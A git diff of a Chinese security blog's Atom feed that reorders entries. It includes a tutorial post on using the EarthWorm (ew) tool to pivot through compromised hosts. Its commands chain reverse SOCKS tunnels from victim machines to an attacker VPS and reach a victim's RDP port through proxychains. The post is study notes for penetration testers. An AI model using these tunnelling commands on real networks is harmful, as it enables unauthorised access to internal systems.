@@ -6,7 +6,7 @@
   <link href="https://phyb0x.github.io/atom.xml" rel="self"/>
   
   <link href="https://phyb0x.github.io/"/>
-  <updated>2021-08-05T10:38:22.017Z</updated>
+  <updated>2019-01-20T13:45:44.000Z</updated>
   <id>https://phyb0x.github.io/</id>
   
   <author>
@@ -15,23 +15,6 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>特征工程</title>
-    <link href="https://phyb0x.github.io/2021/08/05/%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B(%E5%89%AF%E6%9C%AC)/"/>
-    <id>https://phyb0x.github.io/2021/08/05/%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B(%E5%89%AF%E6%9C%AC)/</id>
-    <published>2021-08-05T10:26:00.000Z</published>
-    <updated>2021-08-05T10:38:22.017Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="离散变量处理"><a href="#离散变量处理" class="headerlink" title="离散变量处理"></a>离散变量处理</h3><p>离散型变量一般有两种处理方式：LabelEncoder和OneHotEncoder</p><span id="more"></span><h4 id="LabelEncoder"><a href="#LabelEncoder" class="headerlink" title="LabelEncoder"></a>LabelEncoder</h4><p>LabelEncoder既可以对文字型内容进行编码，也可以对数值型内容进行编码。(从0开始)</p><h4 id="OneHotEncoder"><a href="#OneHotEncoder" class="headerlink" title="OneHotEncoder"></a>OneHotEncoder</h4><p>离散特征中有多少不同的值，就用多少维来表示该特征，是<strong>分类变量</strong>作为<strong>二进制向量</strong>的表示。</p><p>假如我们要计算的文本中一共出现了4个词：猫、狗、牛、羊。向量里每一个位置都代表一个词。所以用 one-hot 来表示就是：</p><p>猫：［1，0，0，0］</p><p>狗：［0，1，0，0］</p><p>牛：［0，0，1，0］</p><p>羊：［0，0，0，1］</p><p>one-hot 的缺点如下：</p><ol><li>无法表达词语之间的关系</li><li>这种过于稀疏的向量，导致计算和存储的效率都不高</li></ol><h3 id="合并稀疏特征"><a href="#合并稀疏特征" class="headerlink" title="合并稀疏特征"></a>合并稀疏特征</h3><p>​    做特征工程时，我们可能会遇到一个特征我们假设其特征列的符号值为v，其特征存在多种取值，标签label设为y，特征v如果有很多特征值对应标签y是相同的，那么这些v之间是没有意义的，我们称之为稀疏特征，这个时候可以进行合并稀疏特征，可以降低计算成本和错误分类的可能性。</p><h3 id="统计特征"><a href="#统计特征" class="headerlink" title="统计特征"></a>统计特征</h3><p>当前样本集的各种统计信息，包括均值、最大值、1分位数、4分位数等。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h3 id=&quot;离散变量处理&quot;&gt;&lt;a href=&quot;#离散变量处理&quot; class=&quot;headerlink&quot; title=&quot;离散变量处理&quot;&gt;&lt;/a&gt;离散变量处理&lt;/h3&gt;&lt;p&gt;离散型变量一般有两种处理方式：LabelEncoder和OneHotEncoder&lt;/p&gt;</summary>
-    
-    
-    
-    
-  </entry>
   
   <entry>
     <title>sql绕安全狗</title>
@@ -117,25 +100,6 @@ WLS 组件远程代码执行 CVE-2017-10271
   </entry>
   
   <entry>
-    <title>ew多级转发</title>
-    <link href="https://phyb0x.github.io/2018/12/28/ew%E5%A4%9A%E7%BA%A7%E8%BD%AC%E5%8F%91/"/>
-    <id>https://phyb0x.github.io/2018/12/28/ew%E5%A4%9A%E7%BA%A7%E8%BD%AC%E5%8F%91/</id>
-    <published>2018-12-28T03:44:14.000Z</published>
-    <updated>2019-01-19T02:06:12.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前用过nc、reGeorg、lcx涉及到的都是一级网络环境，今天看到圈子里发了文章学习记录下。</p><span id="more"></span><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>主要记录下ew在多级网络环境下的使用。这里说下ew穿透成功后，win可以用<a href="http://www.sockscap64.com/" title="SocksCap64">http://www.sockscap64.com</a>，linux用proxychains代理使用。</p><h4 id="一级网络"><a href="#一级网络" class="headerlink" title="一级网络"></a>一级网络</h4><p>普通连接就行了</p><h5 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h5><p>本地机器直接连接靶机(需要靶机有外网)</p><pre><code>ew –s ssocksd –l 888</code></pre><h5 id="反向代理-目标机器没有公网ip，但可访问内部资源"><a href="#反向代理-目标机器没有公网ip，但可访问内部资源" class="headerlink" title="反向代理 (目标机器没有公网ip，但可访问内部资源)"></a>反向代理 (目标机器没有公网ip，但可访问内部资源)</h5><p>vps</p><pre><code>ew -s rcsocks -l 1008 -e 888</code></pre><p>靶机</p><pre><code>ew -s rssocks -d vps:ip -e 888</code></pre><p>linux为例配置proxychains</p><pre><code>vim /etc/proxychains.confsocks5 [攻击者公网IP] 1008proxychains rdesktop [受害者IP]:3389</code></pre><p><img src="https://i.imgur.com/h0f6Gkt.png"></p><p><img src="https://i.imgur.com/Gl5CNxc.png"></p><h4 id="二级网络-一"><a href="#二级网络-一" class="headerlink" title="二级网络(一)"></a>二级网络(一)</h4><p>假设我们有主机A与主机B的权限</p><p><img src="https://i.imgur.com/k3ypgb4.png"></p><p>B主机</p><pre><code>ew -s ssocksd -l 888</code></pre><p>A主机</p><pre><code>ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888</code></pre><p>该命令意思是将1080端口收到的代理请求转交给B主机（10.48.128.49）的888端口。</p><p>最后可以通过访问A主机外网139.XXX.XX.113:1080来使用在B主机架设的socks5代理。</p><h4 id="二级网络-二"><a href="#二级网络-二" class="headerlink" title="二级网络(二)"></a>二级网络(二)</h4><p>假设我们获得了右侧A主机和B主机的控制权限，A主机没有公网IP，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。</p><p><img src="https://i.imgur.com/MbtOKv3.png"></p><p>VPS</p><pre><code>ew –s lcx_listen –l 10800 –e 888</code></pre><p>B主机</p><pre><code>ew -s ssocksd -l 999</code></pre><p>A主机</p><pre><code>ew -s lcx_slave -d VPS:ip -e 888 -f 10.48.128.49 -g 999</code></pre><p>将VPS公网的888端口与B主机内网的999端口连接</p><p>最后可以通过访问公网VPS地址 139.XXX.XX.113:10800来使用在B主机架设的socks5代理。</p><h4 id="三级网络环境"><a href="#三级网络环境" class="headerlink" title="三级网络环境"></a>三级网络环境</h4><p>右侧内网A主机没有公网IP但可以访问外网，B主机不能访问外网但可以被A主机访问、C主机可被B主机访问而且能够访问核心区域。</p><p><img src="https://i.imgur.com/AFPzsKv.png"></p><p>VPS</p><pre><code>ew -s rcsocks -l 1080 -e 888</code></pre><p>A主机</p><pre><code>ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.12 -g 999</code></pre><p>B主机</p><pre><code>ew -s lcx_listen -l 999 -e 777</code></pre><p>C主机</p><pre><code>ew -s rssocks -d 10.48.128.12 -e 777</code></pre><p>在MY PC上可以通过访问公网VPS 139.XXX.XX.113:1080来使用在C主机架设的socks5代理。</p><p>整个数据流向是：SOCKS V5 → 1080 → 888 →999 →777 → rssocks</p><p>直接照搬过来的，理解了其实也不难，就是转来转去中间再搭个桥，主要是能灵活运用。</p><p>参考连接：</p><p><a href="https://www.anquanke.com/post/id/85494">https://www.anquanke.com/post/id/85494</a></p>]]></content>
-    
-    
-    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;之前用过nc、reGeorg、lcx涉及到的都是一级网络环境，今天看到圈子里发了文章学习记录下。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>ARP欺骗</title>
     <link href="https://phyb0x.github.io/2018/12/28/ARP%E6%AC%BA%E9%AA%97/"/>
     <id>https://phyb0x.github.io/2018/12/28/ARP%E6%AC%BA%E9%AA%97/</id>
@@ -146,6 +110,25 @@ WLS 组件远程代码执行 CVE-2017-10271
     
     
     <summary type="html">&lt;h3 id=&quot;Arp协议&quot;&gt;&lt;a href=&quot;#Arp协议&quot; class=&quot;headerlink&quot; title=&quot;Arp协议&quot;&gt;&lt;/a&gt;Arp协议&lt;/h3&gt;</summary>
+    
+    
+    
+    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ew多级转发</title>
+    <link href="https://phyb0x.github.io/2018/12/28/ew%E5%A4%9A%E7%BA%A7%E8%BD%AC%E5%8F%91/"/>
+    <id>https://phyb0x.github.io/2018/12/28/ew%E5%A4%9A%E7%BA%A7%E8%BD%AC%E5%8F%91/</id>
+    <published>2018-12-28T03:44:14.000Z</published>
+    <updated>2019-01-19T02:06:12.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前用过nc、reGeorg、lcx涉及到的都是一级网络环境，今天看到圈子里发了文章学习记录下。</p><span id="more"></span><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>主要记录下ew在多级网络环境下的使用。这里说下ew穿透成功后，win可以用<a href="http://www.sockscap64.com/" title="SocksCap64">http://www.sockscap64.com</a>，linux用proxychains代理使用。</p><h4 id="一级网络"><a href="#一级网络" class="headerlink" title="一级网络"></a>一级网络</h4><p>普通连接就行了</p><h5 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h5><p>本地机器直接连接靶机(需要靶机有外网)</p><pre><code>ew –s ssocksd –l 888</code></pre><h5 id="反向代理-目标机器没有公网ip，但可访问内部资源"><a href="#反向代理-目标机器没有公网ip，但可访问内部资源" class="headerlink" title="反向代理 (目标机器没有公网ip，但可访问内部资源)"></a>反向代理 (目标机器没有公网ip，但可访问内部资源)</h5><p>vps</p><pre><code>ew -s rcsocks -l 1008 -e 888</code></pre><p>靶机</p><pre><code>ew -s rssocks -d vps:ip -e 888</code></pre><p>linux为例配置proxychains</p><pre><code>vim /etc/proxychains.confsocks5 [攻击者公网IP] 1008proxychains rdesktop [受害者IP]:3389</code></pre><p><img src="https://i.imgur.com/h0f6Gkt.png"></p><p><img src="https://i.imgur.com/Gl5CNxc.png"></p><h4 id="二级网络-一"><a href="#二级网络-一" class="headerlink" title="二级网络(一)"></a>二级网络(一)</h4><p>假设我们有主机A与主机B的权限</p><p><img src="https://i.imgur.com/k3ypgb4.png"></p><p>B主机</p><pre><code>ew -s ssocksd -l 888</code></pre><p>A主机</p><pre><code>ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888</code></pre><p>该命令意思是将1080端口收到的代理请求转交给B主机（10.48.128.49）的888端口。</p><p>最后可以通过访问A主机外网139.XXX.XX.113:1080来使用在B主机架设的socks5代理。</p><h4 id="二级网络-二"><a href="#二级网络-二" class="headerlink" title="二级网络(二)"></a>二级网络(二)</h4><p>假设我们获得了右侧A主机和B主机的控制权限，A主机没有公网IP，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。</p><p><img src="https://i.imgur.com/MbtOKv3.png"></p><p>VPS</p><pre><code>ew –s lcx_listen –l 10800 –e 888</code></pre><p>B主机</p><pre><code>ew -s ssocksd -l 999</code></pre><p>A主机</p><pre><code>ew -s lcx_slave -d VPS:ip -e 888 -f 10.48.128.49 -g 999</code></pre><p>将VPS公网的888端口与B主机内网的999端口连接</p><p>最后可以通过访问公网VPS地址 139.XXX.XX.113:10800来使用在B主机架设的socks5代理。</p><h4 id="三级网络环境"><a href="#三级网络环境" class="headerlink" title="三级网络环境"></a>三级网络环境</h4><p>右侧内网A主机没有公网IP但可以访问外网，B主机不能访问外网但可以被A主机访问、C主机可被B主机访问而且能够访问核心区域。</p><p><img src="https://i.imgur.com/AFPzsKv.png"></p><p>VPS</p><pre><code>ew -s rcsocks -l 1080 -e 888</code></pre><p>A主机</p><pre><code>ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.12 -g 999</code></pre><p>B主机</p><pre><code>ew -s lcx_listen -l 999 -e 777</code></pre><p>C主机</p><pre><code>ew -s rssocks -d 10.48.128.12 -e 777</code></pre><p>在MY PC上可以通过访问公网VPS 139.XXX.XX.113:1080来使用在C主机架设的socks5代理。</p><p>整个数据流向是：SOCKS V5 → 1080 → 888 →999 →777 → rssocks</p><p>直接照搬过来的，理解了其实也不难，就是转来转去中间再搭个桥，主要是能灵活运用。</p><p>参考连接：</p><p><a href="https://www.anquanke.com/post/id/85494">https://www.anquanke.com/post/id/85494</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;之前用过nc、reGeorg、lcx涉及到的都是一级网络环境，今天看到圈子里发了文章学习记录下。&lt;/p&gt;</summary>
     
     
     
@@ -302,6 +285,25 @@ WLS 组件远程代码执行 CVE-2017-10271
     
     
     <category term="代码审计" scheme="https://phyb0x.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>业务安全</title>
+    <link href="https://phyb0x.github.io/2018/11/10/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8(%E5%89%AF%E6%9C%AC)/"/>
+    <id>https://phyb0x.github.io/2018/11/10/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8(%E5%89%AF%E6%9C%AC)/</id>
+    <published>2018-11-10T05:27:41.000Z</published>
+    <updated>2019-01-19T02:03:32.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看了业务安全实战指南做的一点笔记，业务逻辑漏洞挖掘还是要细心每个参数功能点都要把握好。</p><span id="more"></span><p><img src="https://i.imgur.com/h1ihbeP.png"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;看了业务安全实战指南做的一点笔记，业务逻辑漏洞挖掘还是要细心每个参数功能点都要把握好。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
     
   </entry>
